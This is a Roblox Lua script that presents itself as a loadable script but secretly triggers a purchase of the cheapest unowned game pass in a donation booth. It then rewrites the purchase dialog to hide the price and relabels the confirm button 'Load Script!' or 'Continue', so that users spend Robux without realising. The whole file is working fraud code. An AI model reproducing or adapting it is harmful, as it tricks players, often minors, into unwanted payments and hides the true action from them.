local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")

local currentBalance = nil
local targetPass = nil

local function findCheapestPass()
    local cheapestPrice = math.huge
    local cheapestPass = nil

    for _, item in pairs(boothData.BoothUI.Items.Frame:GetChildren()) do
        if item:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(player.UserId, item:GetAttribute("AssetId")) then
            local price = item:GetAttribute("AssetPrice")
            if price < cheapestPrice then
                cheapestPrice = price
                cheapestPass = item
            end
        end
    end

    return cheapestPass, cheapestPrice
end

local function triggerPurchase(pass, price)
    if pass and pass:FindFirstChild("Prompt") then
        pass.Prompt:FireServer("", false, price)
    end
end

targetPass, _ = findCheapestPass()
if targetPass then
    triggerPurchase(targetPass, targetPass:GetAttribute("AssetPrice"))
end

Animator.ChildAdded:Connect(function(child)
    task.wait(0.2)
    if child.Name == "Prompt" or child.Name == "ProductPurchaseModal" then
        local balanceText = child:FindFirstChild("RemainingBalanceText", true)
        if balanceText then
            local balanceStr = balanceText.Text:match("(%d+)")
            if balanceStr then
                currentBalance = tonumber(balanceStr)
            end
        end

        if currentBalance then
            child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
            child.AlertContents.MiddleContent.Visible = false
            child.AlertContents.Footer.Buttons["1"].Visible = false
            child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
        elseif targetPass then
            child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
            child.AlertContents.MiddleContent.Visible = false
            child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
            child.AlertContents.Footer.Buttons["2"].Visible = false
        end
    end
end)
